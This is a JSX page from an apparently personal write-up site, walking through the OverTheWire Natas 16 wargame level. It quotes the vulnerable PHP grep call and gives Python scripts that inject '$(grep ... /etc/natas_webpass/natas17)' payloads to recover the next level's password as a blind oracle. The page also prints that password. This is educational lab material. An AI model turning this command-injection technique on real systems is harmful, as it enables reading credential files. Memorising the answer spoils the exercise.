import CodeBlock from "../../components/elements/CodeBlock/CodeBlock"
import PageNav from "../../components/elements/PageNav/PageNav"
import SpoilerKey from "../../components/elements/SpoilerKey/SpoilerKey"

const natas16 = () => {
  return (
    <div>
      <h1>Natas 16</h1>
      <section>
        <h2>Experience</h2>
        <p>
          This is an extended version of Natas 10, with even more characters
          being blacklisted. But more importantly, it also uses double quote
          around the argument to ensure that what we write will only be considered
          as one argument, the pattern to grep.
        </p>
        <CodeBlock language="php">
          {`if($key != "") {
    if(preg_match('/[;|&\`\\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \\"$key\\" dictionary.txt");
    }
}`}
        </CodeBlock>
        <p>
          Now, unfortunately, we are able to bypass this double semicolon
          restriction by using <code>{`$\{...\}`}</code>, the statement inside the dollar curly
          braces notation in shell will be evaluated. This is where things got quite tricky,
          what could we put inside this will still be used by the grep command as the pattern.
          Hence, we will not see the direct output of the commands used inside.
        </p>
        <p>
          After some searching, I discovered that this is actually quite similar
          to Natas 15, we are still able to run some commands, however, we cannot obtain the
          outputs directly. So we must be creative in thinking about how to synergise the command
          inside with what will actually be shown, the matching texts in dictionary.txt. Dictionary.txt contains a large number of common words, however, it should not have the password
          we are looking for. So, we know that it will not return any matches when the password
          is returned by the command we will put inside the curly braces. Surprisingly, this
          will be enough information to construct the password character by character again
          like in Natas 15.
        </p>
        <p>
          So realising the parallel with Natas 15, I used the code written for Natas15 as reference,
          specifically for conducting a POST request. So for the command inside the curly braces,
          I thought, why not use another grep to see if a certain character exist in the password,
          if so, this will return the whole password which will then result in an empty
          result when used as argument for the outside grep. To test things out, I used the
          following code to check which digits are used in the password. The main focus
          here was to see whether the regular expression used work as intended or not.
          The <code>{`^<pre>`}</code> tag was used because I noticed that the page
          returned from the HTML request have the tags on newlines, and I chose the middle
          to match any characters as long as it&apos;s maximum 1 character long. This seem
          reasonable as I check the page returned from the HTML request. Also note the
          usage of groups in the regular expression, as the pre tags are not as important,
          I would like to be able to target the content separately.
        </p>

        <CodeBlock language="python">
          {`for i in range(10):
    payload = {'needle': f'$(grep {i} /etc/natas_webpass/natas17)'}
    r = requests.post(url, headers=headers, data=payload)
    
    
    content = r.content.decode('utf-8')
    regex_result = re.search(r'(^<pre>)(.{0,1})(^</pre>)', content, re.M | re.S)
    # for i in range(3):
    if (regex_result is not None):
    print(i)
    print('yes')
    print(repr(regex_result.group(2)))
    else:
    print('nope')`}
        </CodeBlock>
        <p>
          As this seem to work, I repeated the process with the lettes, lowercase and uppercase.
          At the end of this I learnt that the potential characters used were:
        </p>
        <CodeBlock language=''>
          {`AbcdgGhHkmnNPqQrsSwW035789`}
        </CodeBlock>
        <p>
          With that, I wrote the rest of the code to figure out the order of the
          characters. The logic of this is very similar to the one of Natas15, however in
          this case we were able to narrow down the characters first due to my initial
          testing.
        </p>
        <CodeBlock language="python">
          {`potential = 'AbcdgGhHkmnNPqQrsSwW035789'
password = ''
for i in range(32):
    for char in potential:
        payload = {'needle': f'$(grep ^{password}{char} /etc/natas_webpass/natas17)'}
        r = requests.post(url, headers=headers, data=payload)


        content = r.content.decode('utf-8')
        regex_result = re.search(r'(^<pre>)(.{0,1})(^</pre>)', content, re.M | re.S)
        # for i in range(3):
        if (regex_result is not None):
            password += char
    
print(password)`}
        </CodeBlock>
      </section>
      <section>
        <h2>Reflection</h2>
        <p>
          Again, I found that this was a challenging level with a very clever solution.
          By only checking what is essentially a boolean result, empty match or non empty,
          we were able to properly reconstruct the password character by character.
          Thought this was quite similar to Natas15, I still found it quite challenging
          because of my lack of familiarity with the Unix environment, specifically
          the possibility of using curly braces to evaluate statements. It was especially
          challenging to figure out what I should put inside the curly braces to determine
          what the password was.
        </p>
        <p>
          I had initially thought about using greb to get the character
          of the password at a certain index of the file, then analyse the resulting matches,
          taking the common letter of all the matches, but I realised that this would
          take quite a bit more of effort and time and may not necessarily be correct if
          dictionary.txt does not have a match, e.g. for the numbers. That was how I experimented
          with the digits first, because I knew the first charcter of the password is a
          number as grep yielded no matches when it searches for the first character in
          dictionary.txt
        </p>
        <p>
          I think this challenge required a lot of creative thinking especially
          in determining what to put inside the curly braces. Especially relevant
          to hone our ability to put ourselves in the shoe of the attacker. They may
          have limited amount of resources and knowledge and must hence use them creatively
          in ways the defender wouldn&apos;t even consider. Otherwise, many of the things
          talked about in Natas 15 also apply here.
        </p>
      </section>
      <SpoilerKey>
        {`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  `}
      </SpoilerKey>
      <PageNav link1='/natas/natas15' link2='/leviathan/' />
    </div>
  )
}
export default natas16